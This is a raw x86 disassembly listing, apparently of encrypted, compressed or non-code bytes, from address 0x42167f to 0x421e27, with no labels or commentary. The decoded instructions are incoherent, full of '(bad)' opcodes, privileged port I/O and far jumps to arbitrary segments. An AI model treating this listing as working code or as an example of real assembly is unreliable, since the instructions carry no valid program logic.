  42167f:	xor    DWORD PTR [edi+0x4c11098c],0x9dfe5f04
  421689:	or     DWORD PTR [ecx],0x38
  42168c:	cwde   
  42168d:	inc    ecx
  42168e:	int3   
  42168f:	(bad)  
  421690:	fmul   st(5),st
  421692:	xor    ebx,DWORD PTR [eax]
  421694:	mov    bl,0x38
  421696:	leave  
  421697:	and    WORD PTR [edi],0xffec
  42169b:	mov    ds:0x595ceeda,al
  4216a0:	jns    0x421671
  4216a2:	inc    eax
  4216a3:	xor    BYTE PTR [edx],cl
  4216a5:	aas    
  4216a6:	inc    ebx
  4216a7:	and    DWORD PTR [edi+0x44],esp
  4216aa:	cwde   
  4216ab:	rcr    DWORD PTR [edi+0x14f019d0],0xe
  4216b2:	leave  
  4216b3:	cli    
  4216b4:	xor    DWORD PTR [ebx],ebp
  4216b6:	push   edx
  4216b7:	fdivr  QWORD PTR [edx-0x564cbdd4]
  4216bd:	mov    dh,0xd6
  4216bf:	pusha  
  4216c0:	and    DWORD PTR [eax+eiz*4-0x5d],ecx
  4216c4:	repz mov esi,0xfdca7ac6
  4216ca:	sub    edi,DWORD PTR [esi]
  4216cc:	pop    eax
  4216cd:	sub    bh,BYTE PTR [ecx]
  4216cf:	dec    ebx
  4216d0:	adc    bl,bh
  4216d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216d3:	xor    eax,0x2f734093
  4216d8:	jne    0x4216cc
  4216da:	not    esi
  4216dc:	mov    al,0xea
  4216de:	and    edi,DWORD PTR [esp+edx*8+0x2cc8270]
  4216e5:	inc    ecx
  4216e6:	adc    DWORD PTR [eax],ecx
  4216e8:	mov    edi,0x3d0ff36e
  4216ed:	inc    edx
  4216ee:	dec    ecx
  4216ef:	ror    DWORD PTR [ebp+0x457766bd],0xba
  4216f6:	jecxz  0x42176d
  4216f8:	mov    dh,0x5b
  4216fa:	mov    edx,0x95ce3494
  4216ff:	xor    DWORD PTR [esi+0x53],ecx
  421702:	mov    eax,ds:0x7027befa
  421707:	rol    BYTE PTR [esi+ebx*1+0x15],cl
  42170b:	in     eax,dx
  42170c:	cmp    eax,0xd9edb75f
  421711:	pop    ds
  421712:	and    dh,BYTE PTR [eax+0x2051a5a5]
  421718:	cmp    ch,BYTE PTR [eax]
  42171a:	fisubr DWORD PTR [edx-0x20]
  42171d:	xlat   BYTE PTR ds:[ebx]
  42171e:	mov    ebx,0x5cbaed73
  421723:	sar    ebp,1
  421725:	cld    
  421726:	sub    eax,0x30ef52d8
  42172b:	(bad)  
  42172c:	pop    ebx
  42172d:	aad    0x58
  42172f:	pop    ebp
  421730:	call   0x4cfc693b
  421735:	and    eax,0xf57fe521
  42173a:	aad    0x3
  42173c:	push   cs
  42173d:	add    DWORD PTR [edx+0x1e25ff0d],eax
  421743:	lahf   
  421744:	pop    ebp
  421745:	mov    al,ds:0x2bb5dca7
  42174a:	dec    edi
  42174b:	sub    al,0x13
  42174d:	and    edi,eax
  42174f:	xor    al,0x64
  421751:	les    ebx,FWORD PTR [eax+0x16]
  421754:	in     al,0xb1
  421756:	push   eax
  421757:	sub    bl,dh
  421759:	imul   edi,ecx,0x8817396a
  42175f:	imul   ebx,DWORD PTR [eax+0xc],0xad1e95f1
  421766:	cli    
  421767:	lods   eax,DWORD PTR ds:[esi]
  421768:	rol    BYTE PTR [ebp-0x1c],1
  42176b:	loopne 0x4217dd
  42176d:	pop    si
  42176f:	ins    BYTE PTR es:[edi],dx
  421770:	mov    dl,0x4b
  421772:	retf   0x877f
  421775:	push   ecx
  421776:	sbb    dl,BYTE PTR [edx]
  421778:	adc    al,0x61
  42177a:	test   al,0x21
  42177c:	bnd jmp eax
  42177f:	iret   
  421780:	lods   eax,DWORD PTR ds:[esi]
  421781:	cdq    
  421782:	repz or DWORD PTR ds:0xf05d5b82,esp
  421789:	inc    edx
  42178a:	mov    edi,0xecc5c56c
  42178f:	xor    DWORD PTR [edi+0x6d],ebp
  421792:	mul    BYTE PTR [esi+edx*4-0x80]
  421796:	cmc    
  421797:	jne    0x4217ba
  421799:	stos   BYTE PTR es:[edi],al
  42179a:	test   BYTE PTR [esi+0x7c],al
  42179d:	inc    esp
  42179e:	jb     0x4217af
  4217a0:	push   cs
  4217a1:	in     eax,dx
  4217a2:	fwait
  4217a3:	in     al,0x98
  4217a5:	mov    esi,0xd3f1dad3
  4217aa:	iret   
  4217ab:	aad    0xe9
  4217ad:	push   ebx
  4217ae:	mov    WORD PTR [esi-0x2ed526f8],gs
  4217b4:	push   edx
  4217b5:	mov    esi,ebp
  4217b7:	adc    bl,BYTE PTR [eax+0x51]
  4217ba:	jb     0x42173d
  4217bc:	pusha  
  4217bd:	(bad)  
  4217be:	fstp   st(4)
  4217c0:	pushf  
  4217c1:	pop    eax
  4217c2:	mov    esi,0xe431f65b
  4217c7:	add    al,BYTE PTR [ebp-0x73ed227f]
  4217cd:	xchg   edi,eax
  4217ce:	mov    ebx,0x75df736b
  4217d3:	loope  0x4217b7
  4217d5:	mov    bh,0xf1
  4217d7:	mov    dh,BYTE PTR [edi-0x24]
  4217da:	mov    dl,ch
  4217dc:	nop
  4217dd:	add    eax,0xec72f599
  4217e2:	bound  ebp,QWORD PTR [esi]
  4217e4:	(bad)  
  4217e5:	pop    ebx
  4217e6:	xchg   esp,eax
  4217e7:	xlat   BYTE PTR ds:[ebx]
  4217e8:	push   ebp
  4217e9:	jg     0x42180e
  4217eb:	ds jne 0x4217e5
  4217ee:	xchg   edi,eax
  4217ef:	xor    BYTE PTR [ebx-0x5d],dh
  4217f2:	lds    edx,FWORD PTR [ebx-0x6e06639]
  4217f8:	xchg   esp,eax
  4217f9:	aaa    
  4217fa:	iret   
  4217fb:	ds mov esp,0x95a2319c
  421801:	sar    dl,cl
  421803:	loopne 0x42184c
  421805:	mov    dh,bh
  421807:	dec    ebx
  421808:	ret    0x6d42
  42180b:	lahf   
  42180c:	adc    ebx,DWORD PTR [ecx+eiz*1+0x4d9fe54d]
  421813:	push   ecx
  421814:	sar    DWORD PTR [eax],0x4a
  421817:	pop    ss
  421818:	(bad)  
  421819:	jmp    0x4db458a6
  42181e:	jb     0x4217c7
  421820:	pop    ebp
  421821:	rcl    esp,0x8e
  421824:	imul   ebx,DWORD PTR [esi-0x59],0x290dcc12
  42182b:	fild   WORD PTR [esp+ebx*1+0x73]
  42182f:	add    ah,BYTE PTR [edx]
  421831:	push   0xffffff98
  421833:	stc    
  421834:	imul   esp,DWORD PTR [edx],0xffffffc5
  421837:	xlat   BYTE PTR ds:[ebx]
  421838:	mov    ebx,0x1728b801
  42183d:	fs pop eax
  42183f:	mov    BYTE PTR [esi-0x5b],dl
  421842:	mov    esi,DWORD PTR [ebp+0x1b9e4d2d]
  421848:	pop    es
  421849:	je     0x42189f
  42184b:	jp     0x421860
  42184d:	adc    al,0x57
  42184f:	push   edx
  421850:	add    eax,0x2709f7d5
  421855:	mov    cl,BYTE PTR [ebx-0x705fa09b]
  42185b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42185c:	jmp    0x6f1:0x4a77b937
  421863:	test   BYTE PTR [eax],al
	...
  421871:	ds inc esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    DWORD PTR [ebx-0x3a0dc18d],ebx
  421882:	xchg   ecx,eax
  421883:	add    DWORD PTR [eax],eax
  421885:	stos   DWORD PTR es:[edi],eax
  421886:	add    eax,DWORD PTR [eax]
  421888:	add    BYTE PTR [esi-0x6d02fe00],dl
  42188e:	cmp    BYTE PTR [ecx+edi*2-0xe482efa],dh
  421895:	jns    0x421916
  421897:	or     al,0x2a
  421899:	adc    ecx,DWORD PTR [ebp-0x63b2a823]
  42189f:	mov    ch,0x83
  4218a1:	rol    DWORD PTR [esi],1
  4218a3:	xor    DWORD PTR [esi+eax*4],edx
  4218a6:	cld    
  4218a7:	push   edi
  4218a8:	cmp    al,0x71
  4218aa:	mov    al,ds:0xe2580509
  4218b0:	pusha  
  4218b1:	ret    
  4218b2:	pop    ss
  4218b3:	pop    es
  4218b4:	into   
  4218b5:	inc    esp
  4218b6:	scas   al,BYTE PTR es:[edi]
  4218b7:	outs   dx,BYTE PTR ds:[esi]
  4218b8:	inc    ecx
  4218b9:	mov    ebp,esi
  4218bb:	popa   
  4218bc:	cs (bad) 
  4218be:	loope  0x42187e
  4218c0:	mov    dl,0x39
  4218c2:	sub    dl,bh
  4218c4:	push   cs
  4218c5:	data16 mov bl,0x5c
  4218c8:	jno    0x421862
  4218ca:	push   0x72
  4218cc:	mov    dh,0x5d
  4218ce:	pop    eax
  4218d0:	icebp  
  4218d1:	add    al,0xf1
  4218d3:	lds    edx,FWORD PTR [esi+0x7b67d749]
  4218d9:	mov    cs,WORD PTR [edi]
  4218db:	cli    
  4218dc:	cmp    eax,0xce0bca6d
  4218e1:	test   BYTE PTR [esi+eax*8-0x49cd4112],dl
  4218e8:	cmp    BYTE PTR [edi],dh
  4218ea:	inc    esp
  4218eb:	pop    esi
  4218ec:	sub    al,0x5b
  4218ee:	cmp    edx,edx
  4218f0:	push   0x56
  4218f2:	mov    edi,0xb80d6576
  4218f7:	rol    DWORD PTR ds:0x88d6f176,1
  4218fd:	push   0xffffffa0
  4218ff:	ret    
  421900:	sti    
  421901:	mov    edx,0x51f02a7f
  421906:	xchg   ebp,ebp
  421908:	call   0x70760d93
  42190d:	mov    eax,es:0x60ed3b88
  421913:	in     eax,0xb0
  421915:	out    0x39,eax
  421917:	lahf   
  421918:	jg     0x42193e
  42191a:	inc    ebp
  42191b:	fwait
  42191c:	mov    edi,DWORD PTR [edx-0x2df3d467]
  421922:	mov    dl,0x5c
  421924:	mov    cl,BYTE PTR [ecx+0x14]
  421927:	sub    edi,DWORD PTR [ebp-0x4ebbbf53]
  42192d:	cmp    eax,0xfca7c8f3
  421932:	pop    eax
  421933:	mov    DWORD PTR [ebp+0x1190197b],ecx
  421939:	int3   
  42193a:	mov    bl,BYTE PTR [edi-0x534c9424]
  421940:	or     al,0x5c
  421942:	and    BYTE PTR [edi-0x7b2a8ed8],0xd5
  421949:	cwde   
  42194a:	outs   dx,DWORD PTR ds:[esi]
  42194b:	ror    ch,0xd3
  42194e:	and    eax,0xbe25591b
  421953:	hlt    
  421954:	mov    al,bl
  421956:	mov    esp,0xc682ba7c
  42195b:	pop    eax
  42195c:	arpl   si,bp
  42195e:	cmp    eax,0x27f179b
  421963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421964:	mov    ebp,0x5e50d109
  421969:	mov    ah,0xaa
  42196b:	cmp    BYTE PTR [esi+0x5a],dh
  42196e:	retf   0x7b5e
  421971:	mov    ecx,0x3f8cf340
  421976:	mov    BYTE PTR [edx+0xf],al
  421979:	push   ds
  42197a:	jns    0x4219e7
  42197c:	xlat   BYTE PTR ds:[ebx]
  42197d:	aam    0x7b
  42197f:	dec    eax
  421980:	pop    edi
  421981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421982:	mov    eax,ds:0x17aab9aa
  421987:	pusha  
  421988:	jecxz  0x421995
  42198a:	add    ebx,DWORD PTR [ecx+0x5ad371b9]
  421990:	fadd   DWORD PTR [ebx]
  421992:	pop    es
  421993:	(bad)  
  421994:	dec    esi
  421995:	ins    DWORD PTR es:[edi],dx
  421996:	shl    al,0xc1
  421999:	or     bh,BYTE PTR [eax]
  42199b:	sbb    esi,esi
  42199d:	mov    ebx,0xad6e97e8
  4219a2:	mov    ds:0x21e6e31c,eax
  4219a7:	pushf  
  4219a8:	xchg   edx,eax
  4219a9:	or     esp,DWORD PTR [ebx-0x49fc8dda]
  4219af:	les    ebx,FWORD PTR [esi]
  4219b1:	jecxz  0x421a2d
  4219b3:	loop   0x42195b
  4219b5:	add    BYTE PTR [edi+edi*2],0xa7
  4219b9:	ins    DWORD PTR es:[edi],dx
  4219ba:	push   esi
  4219bb:	mov    bh,0x49
  4219bd:	fwait
  4219be:	sbb    BYTE PTR [eax],ah
  4219c0:	pop    ss
  4219c1:	stos   DWORD PTR es:[edi],eax
  4219c2:	dec    ecx
  4219c3:	enter  0x649b,0x8
  4219c7:	(bad)  
  4219c8:	shl    DWORD PTR [edi],1
  4219ca:	pop    esi
  4219cb:	push   esp
  4219cc:	cmp    ebp,ecx
  4219ce:	mov    DWORD PTR [edx],edi
  4219d0:	xchg   edi,eax
  4219d1:	or     eax,0x14697858
  4219d6:	xchg   esi,eax
  4219d7:	sbb    eax,0xa8d1e2f6
  4219dc:	int    0x65
  4219de:	xor    dh,BYTE PTR [eax+0x26]
  4219e1:	inc    eax
  4219e2:	jmp    0x787f:0x3caa64cd
  4219e9:	rcl    ecx,0x7f
  4219ec:	dec    ebp
  4219ed:	stos   DWORD PTR es:[edi],eax
  4219ee:	jp     0x4219c2
  4219f0:	loop   0x421974
  4219f2:	(bad)  
  4219f3:	sub    BYTE PTR [ebp+ebx*1-0x6dad8fc],dh
  4219fa:	mov    cl,0xef
  4219fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219fd:	xchg   edi,eax
  4219fe:	popa   
  4219ff:	imul   ecx,edx,0x28
  421a02:	cld    
  421a03:	xor    esi,eax
  421a05:	retf   0xd98d
  421a08:	or     al,0x61
  421a0a:	mov    dh,0x29
  421a0c:	add    eax,0xafe4dcc
  421a11:	je     0x421a07
  421a13:	push   eax
  421a14:	js     0x4219d9
  421a16:	push   ds
  421a17:	bound  ebx,QWORD PTR [edx-0x7567fbe0]
  421a1d:	cmp    cl,bh
  421a1f:	daa    
  421a20:	cmp    ebp,DWORD PTR [ecx+eiz*8]
  421a23:	rol    DWORD PTR [esi+0x64baff58],1
  421a29:	or     DWORD PTR [edx],edi
  421a2b:	pop    ebp
  421a2c:	add    BYTE PTR [esi],dh
  421a2e:	inc    eax
  421a2f:	pop    ds
  421a30:	ret    
  421a31:	mov    esi,ebp
  421a33:	xchg   esi,eax
  421a34:	xor    al,0xbf
  421a36:	bnd jp 0x4219e3
  421a39:	or     al,0xa9
  421a3b:	loopne 0x421a3e
  421a3d:	je     0x421a68
  421a3f:	mov    esi,0x42f95939
  421a44:	inc    eax
  421a45:	lock retf 0x436b
  421a49:	dec    ebp
  421a4a:	fcmovb st,st(7)
  421a4c:	(bad)  
  421a4d:	push   edi
  421a4e:	enter  0xfa6a,0xfc
  421a52:	pop    edi
  421a53:	mov    ecx,esi
  421a55:	sbb    dl,bl
  421a57:	(bad)  
  421a59:	lock push cs
  421a5b:	scas   eax,DWORD PTR es:[edi]
  421a5c:	xor    bh,BYTE PTR [ecx-0x7a]
  421a5f:	leave  
  421a60:	mov    edx,0x193f807c
  421a65:	mov    ds:0x3095a4a4,eax
  421a6a:	xor    BYTE PTR ds:0x151a98f9,bh
  421a70:	ja     0x421a08
  421a72:	sbb    eax,0x21a87628
  421a77:	pop    ebx
  421a78:	outs   dx,BYTE PTR ds:[esi]
  421a79:	cmc    
  421a7a:	pusha  
  421a7b:	leave  
  421a7c:	and    eax,0xc1ab5e86
  421a81:	jns    0x421a32
  421a83:	je     0x421af6
  421a85:	sbb    eax,0x2dc75774
  421a8a:	pop    ds
  421a8b:	cwde   
  421a8c:	push   0xffffffbc
  421a8e:	xchg   dh,ch
  421a90:	div    DWORD PTR [eax+0x9ffee6a]
  421a96:	retf   
  421a97:	xlat   BYTE PTR ds:[ebx]
  421a98:	and    ecx,DWORD PTR [ebp+ebp*4-0x1741edae]
  421a9f:	jmp    0xca8526d8
  421aa4:	sub    BYTE PTR [ecx],al
  421aa6:	ret    0x6561
  421aa9:	repz push ebx
  421aab:	adc    eax,0xe697dcfe
  421ab1:	and    dh,BYTE PTR [eax]
  421ab3:	bound  edi,QWORD PTR [edx]
  421ab5:	outs   dx,DWORD PTR ds:[esi]
  421ab6:	in     eax,dx
  421ab7:	lods   al,BYTE PTR ds:[esi]
  421ab8:	out    dx,al
  421ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aba:	ret    0x33a5
  421abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421abe:	repz fs jl 0x421aad
  421ac2:	cdq    
  421ac3:	js     0x421b33
  421ac5:	pop    es
  421ac6:	jmp    0x398d:0xd515421e
  421acd:	sbb    al,0x8f
  421acf:	xlat   BYTE PTR ds:[ebx]
  421ad0:	jno    0x421b11
  421ad2:	(bad)  
  421ad3:	aad    0xeb
  421ad5:	in     eax,0xd5
  421ad7:	xlat   BYTE PTR ds:[ebx]
  421ad8:	pop    ebp
  421ad9:	inc    edx
  421ada:	and    BYTE PTR [esi+eiz*1-0xdb98e0],0x6
  421ae2:	mov    ebp,0xc9db5400
  421ae7:	lods   al,BYTE PTR ds:[esi]
  421ae8:	adc    bl,ch
  421aea:	in     al,0xd5
  421aec:	lods   eax,DWORD PTR ds:[esi]
  421aed:	sub    eax,0x7f2daebb
  421af2:	pop    esi
  421af3:	cld    
  421af4:	in     al,0x2b
  421af6:	ja     0x421aeb
  421af8:	das    
  421af9:	add    DWORD PTR [ecx+edx*2-0x37081157],eax
  421b00:	mov    bl,0xc9
  421b02:	mov    ds:0xc4211858,eax
  421b07:	std    
  421b08:	mov    WORD PTR [ecx+0x3d],es
  421b0b:	sbb    DWORD PTR [esi+0x6e],esi
  421b0e:	fsubr  QWORD PTR es:[edi-0x3e9db373]
  421b15:	(bad)  
  421b16:	aad    0x95
  421b18:	mov    ds:0x6edf7129,eax
  421b1d:	inc    esi
  421b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b1f:	fcmove st,st(3)
  421b21:	(bad)  
  421b22:	adc    BYTE PTR [edi+ebp*1-0x60aefdfe],dh
  421b29:	inc    esi
  421b2a:	xchg   DWORD PTR [eax-0x21],eax
  421b2d:	rcr    bh,0xba
  421b30:	push   0x79b7e68f
  421b35:	push   ss
  421b36:	inc    esp
  421b37:	and    al,0x1
  421b39:	mov    dh,0x7
  421b3b:	xchg   edx,eax
  421b3c:	or     BYTE PTR [ecx],cl
  421b3e:	lahf   
  421b3f:	ror    BYTE PTR [eax],0xa1
  421b42:	icebp  
  421b43:	mov    edi,0x958a330e
  421b48:	loop   0x421b92
  421b4a:	loopne 0x421b51
  421b4c:	mov    ebp,0xd3643200
  421b51:	sub    ch,BYTE PTR [ecx+0x32300fe3]
  421b57:	adc    ch,BYTE PTR [ebp-0x65bf06a3]
  421b5d:	stos   DWORD PTR es:[edi],eax
  421b5e:	xor    dl,bh
  421b60:	bound  ebp,QWORD PTR [esi-0x3c]
  421b63:	cmp    BYTE PTR [edx+ebx*1-0x3fc9c0ce],ch
  421b6a:	cdq    
  421b6b:	in     eax,0x81
  421b6d:	or     DWORD PTR [ebx-0x5a13e473],ebp
  421b73:	add    eax,0xd66c87bc
  421b78:	sbb    BYTE PTR [esi],bl
  421b7a:	ror    ah,1
  421b7c:	outs   dx,BYTE PTR ds:[esi]
  421b7d:	mov    edx,0x909a988c
  421b82:	jle    0x421be4
  421b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b85:	or     al,0xad
  421b87:	mov    bh,0x48
  421b89:	lea    ebx,[edx+0x4c]
  421b8c:	mov    bl,0x32
  421b8e:	mov    bh,0x9
  421b90:	cmp    bh,al
  421b92:	cmp    BYTE PTR [ebx+eax*1+0x43],ah
  421b96:	push   ecx
  421b97:	ins    DWORD PTR es:[edi],dx
  421b98:	push   cs
  421b99:	cwde   
  421b9a:	jbe    0x421b90
  421b9c:	mov    eax,ds:0x5c3801b9
  421ba1:	dec    edi
  421ba2:	inc    edx
  421ba3:	shr    BYTE PTR [edx+edi*1],1
  421ba6:	aas    
  421ba7:	xchg   DWORD PTR [ecx+0xd220c04],edi
  421bad:	adc    DWORD PTR [edx],ecx
  421baf:	pop    ds
  421bb0:	adc    bl,0x3
  421bb3:	std    
  421bb4:	adc    BYTE PTR [esi+0x33],dh
  421bb7:	jns    0x421b9b
  421bb9:	pop    ebp
  421bba:	outs   dx,BYTE PTR ds:[esi]
  421bbb:	mov    DWORD PTR [ecx-0x4a],ebp
  421bbe:	mov    ah,0xe6
  421bc0:	repnz dec ecx
  421bc2:	mov    ebx,0x29fbca28
  421bc7:	jg     0x421bac
  421bc9:	xlat   BYTE PTR ds:[ebx]
  421bca:	loop   0x421c2f
  421bcc:	mov    ebx,0x2c507269
  421bd1:	mov    bh,bh
  421bd3:	shl    al,1
  421bd5:	das    
  421bd6:	fst    DWORD PTR [ecx]
  421bd8:	or     DWORD PTR [ecx+0x5],0x63
  421bdc:	out    0x75,eax
  421bde:	xor    esp,DWORD PTR [edx+0x51]
  421be1:	or     al,0xc1
  421be3:	sub    DWORD PTR [esi+ebx*2+0x76582dde],ecx
  421bea:	pop    ebp
  421beb:	or     eax,0xd23e7b0b
  421bf0:	arpl   WORD PTR [ebx],dx
  421bf2:	mov    bl,BYTE PTR [eax+ecx*8-0x34b45506]
  421bf9:	ss sub dh,dh
  421bfc:	lods   al,BYTE PTR ds:[esi]
  421bfd:	jnp    0x421c08
  421bff:	in     al,0x19
  421c01:	xor    BYTE PTR [ecx+0x5543e52e],dl
  421c07:	(bad)  
  421c08:	out    dx,al
  421c09:	inc    esi
  421c0a:	push   cs
  421c0b:	aaa    
  421c0c:	addr16 hlt 
  421c0e:	mov    eax,0x391c7def
  421c13:	cdq    
  421c14:	scas   al,BYTE PTR es:[edi]
  421c15:	push   eax
  421c16:	js     0x421c7f
  421c18:	arpl   WORD PTR [edx-0x77],di
  421c1b:	cmp    dh,0x1b
  421c1e:	fnstsw WORD PTR [ecx+0x78]
  421c21:	std    
  421c22:	jmp    0x6403:0xa2f0f01c
  421c29:	cmc    
  421c2a:	pop    eax
  421c2b:	loopne 0x421c6d
  421c2d:	ins    DWORD PTR es:[edi],dx
  421c2e:	push   ds
  421c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c30:	xor    cl,BYTE PTR [eax-0x49]
  421c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  421c40:	add    BYTE PTR [edx+eax*8],cl
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0x44971a56
  421c4e:	cld    
  421c4f:	push   ebp
  421c50:	and    dh,BYTE PTR [eax-0x6b]
  421c53:	add    DWORD PTR [eax],eax
  421c55:	stos   DWORD PTR es:[edi],eax
  421c56:	add    eax,DWORD PTR [eax]
  421c58:	add    BYTE PTR [esi+ebp*2+0x19c4646d],ah
  421c5f:	leave  
  421c60:	jmp    0xdac4:0xd1a3ef3f
  421c67:	xchg   edx,eax
  421c68:	in     eax,dx
  421c69:	sahf   
  421c6a:	retf   0x30da
  421c6d:	cmp    DWORD PTR [edx+0x4d229390],ecx
  421c73:	arpl   WORD PTR [edi],bx
  421c75:	add    dl,ah
  421c77:	and    esi,esp
  421c79:	lahf   
  421c7a:	cmp    esi,eax
  421c7c:	inc    BYTE PTR [ebp+0x667d98e]
  421c82:	add    eax,0xe8830caf
  421c87:	push   0x3e39195
  421c8c:	ins    BYTE PTR es:[edi],dx
  421c8d:	mov    edi,0x65e0e0c2
  421c92:	int3   
  421c93:	clc    
  421c94:	or     al,ch
  421c96:	cmp    DWORD PTR [eax-0x19],ebx
  421c99:	lds    ebx,FWORD PTR [esi]
  421c9b:	push   esi
  421c9c:	push   esp
  421c9d:	std    
  421c9e:	jne    0x421c96
  421ca0:	inc    eax
  421ca1:	shl    esp,cl
  421ca3:	cld    
  421ca4:	popf   
  421ca5:	push   esi
  421ca6:	out    dx,al
  421ca7:	fsub   st,st(5)
  421ca9:	(bad)
  421cad:	mov    al,0x5a
  421caf:	cmp    al,0x77
  421cb1:	scas   eax,DWORD PTR es:[edi]
  421cb2:	out    dx,eax
  421cb3:	dec    edx
  421cb4:	add    DWORD PTR [eax+0x60],esi
  421cb7:	test   al,0xa4
  421cb9:	popf   
  421cba:	inc    esp
  421cbb:	call   0xae1b:0x536a653a
  421cc2:	daa    
  421cc3:	inc    edi
  421cc4:	loopne 0x421cfb
  421cc6:	push   ss
  421cc7:	scas   eax,DWORD PTR es:[edi]
  421cc8:	lock inc edi
  421cca:	push   0xffffff9a
  421ccc:	mov    ebp,edi
  421cce:	xchg   esi,eax
  421ccf:	xchg   ecx,eax
  421cd0:	dec    ecx
  421cd1:	jecxz  0x421cd0
  421cd3:	inc    esp
  421cd4:	adc    al,0x4d
  421cd6:	cwde   
  421cd7:	and    eax,0x113d050
  421cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cdd:	xchg   ecx,eax
  421cde:	enter  0x4b8a,0xa4
  421ce2:	mov    ds:0x7e909972,al
  421ce7:	mov    bl,0x77
  421ce9:	and    dh,BYTE PTR [esi+0x1c]
  421cec:	test   eax,0xc67ed927
  421cf1:	and    al,0x57
  421cf3:	js     0x421d4b
  421cf5:	rol    DWORD PTR [ecx+eiz*1],cl
  421cf8:	inc    edx
  421cf9:	mov    edx,0xa7f91ec8
  421cfe:	add    al,0xfa
  421d00:	fistp  DWORD PTR [eax-0x73cfef33]
  421d06:	jb     0x421d0a
  421d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d09:	movsx  edi,BYTE PTR [ecx-0x9]
  421d0d:	jl     0x421d16
  421d0f:	push   ebp
  421d10:	aad    0x98
  421d12:	pop    ds
  421d13:	jmp    0xffa280af
  421d18:	lods   eax,DWORD PTR ds:[esi]
  421d19:	ins    BYTE PTR es:[edi],dx
  421d1a:	test   DWORD PTR [eax-0x185202ff],edi
  421d20:	jns    0x421cde
  421d22:	fsub   QWORD PTR [ecx+0x5b]
  421d25:	mov    al,ds:0x3e5c9329
  421d2a:	and    edi,DWORD PTR [edx]
  421d2c:	out    dx,eax
  421d2d:	xchg   ecx,esi
  421d2f:	xor    esi,DWORD PTR [esi+edi*1]
  421d32:	call   0x5416c3a4
  421d37:	sahf   
  421d38:	jl     0x421d09
  421d3a:	add    ch,bh
  421d3c:	fistp  WORD PTR [edi+edx*4]
  421d3f:	sub    ebx,edi
  421d41:	dec    ebx
  421d42:	push   ecx
  421d43:	cmp    esp,edi
  421d45:	getsec 
  421d47:	xor    al,0x78
  421d49:	cld    
  421d4a:	pop    ecx
  421d4b:	push   es
  421d4c:	aam    0x35
  421d4e:	(bad)  
  421d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d51:	cs add al,0x76
  421d54:	mov    ds:0xee1f50ec,eax
  421d59:	inc    edx
  421d5a:	push   ds
  421d5b:	xchg   edi,eax
  421d5c:	daa    
  421d5d:	sub    ah,BYTE PTR [eax+0x41ce49e2]
  421d63:	mov    esi,0xeb1cd8c2
  421d68:	add    esi,DWORD PTR gs:[esi]
  421d6b:	(bad)  
  421d6c:	std    
  421d6d:	pusha  
  421d6e:	fsubr  DWORD PTR [eax+0x4]
  421d71:	shl    BYTE PTR [edx],cl
  421d73:	bound  ebp,QWORD PTR [edx+ebp*8-0x79]
  421d77:	bound  esp,QWORD PTR [ebx+ebx*2+0x5a]
  421d7b:	mov    edi,DWORD PTR [esi-0x465e15bb]
  421d81:	in     al,dx
  421d82:	test   BYTE PTR [edi+0x1d],dl
  421d85:	xchg   edi,eax
  421d86:	pushf  
  421d87:	push   0x1b
  421d89:	xchg   DWORD PTR [edx-0x13e3b5a6],ebp
  421d8f:	and    eax,0xbac8ed1
  421d94:	sub    al,0x23
  421d96:	aam    0x8
  421d98:	fwait
  421d99:	mov    edx,edi
  421d9b:	dec    ecx
  421d9c:	or     ah,bl
  421d9e:	sbb    DWORD PTR [edi],edx
  421da0:	xchg   ecx,eax
  421da1:	loop   0x421db3
  421da3:	adc    ah,bh
  421da5:	inc    ecx
  421da6:	cld    
  421da7:	fdivr  st(4),st
  421da9:	popa   
  421daa:	mov    ds:0xd0d5d73e,al
  421daf:	aam    0xb0
  421db1:	sbb    ah,ch
  421db3:	enter  0x978b,0x8a
  421db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421db8:	jno    0x421d47
  421dba:	(bad)  
  421dbc:	fisubr DWORD PTR [eax+ebp*8-0x2e7e7eec]
  421dc3:	and    DWORD PTR [esp+ebx*8],edx
  421dc6:	mov    ?,WORD PTR [edx-0xac93750]
  421dcc:	aad    0x69
  421dce:	mov    dh,0xa8
  421dd0:	pop    eax
  421dd1:	inc    edi
  421dd2:	and    eax,0x2325d58c
  421dd7:	jnp    0x421e51
  421dd9:	sub    edi,DWORD PTR [ebp-0x44]
  421ddc:	lock aad 0x97
  421ddf:	sub    eax,0x5464d038
  421de4:	leave  
  421de5:	xchg   edi,eax
  421de6:	sbb    esp,DWORD PTR [edx+0x2cefd161]
  421dec:	retf   0xa35c
  421def:	aaa    
  421df0:	pop    ecx
  421df1:	bound  edi,QWORD PTR [edx+0x2804a29]
  421df7:	xchg   edi,eax
  421df8:	shl    cl,0x27
  421dfb:	enter  0xad94,0x63
  421dff:	mov    eax,ds:0x3c4d6233
  421e04:	in     al,0xa9
  421e06:	cdq    
  421e07:	in     al,dx
  421e08:	scas   eax,DWORD PTR es:[edi]
  421e09:	pop    eax
  421e0a:	repz gs imul edx,esi,0x8169337f
  421e12:	fldcw  WORD PTR [ebx+ebp*8]
  421e15:	pop    ecx
  421e16:	inc    esi
  421e17:	push   ecx
  421e18:	or     al,0xf4
  421e1a:	mov    cl,0xac
  421e1c:	pushf  
  421e1d:	in     eax,dx
  421e1e:	jae    0x421e67
  421e20:	sub    ecx,ebp
  421e22:	stos   DWORD PTR es:[edi],eax
  421e23:	cmc    
  421e24:	retf   0x79a1
  421e27:	sub    DWORD PTR [ebp-0x4e],edx
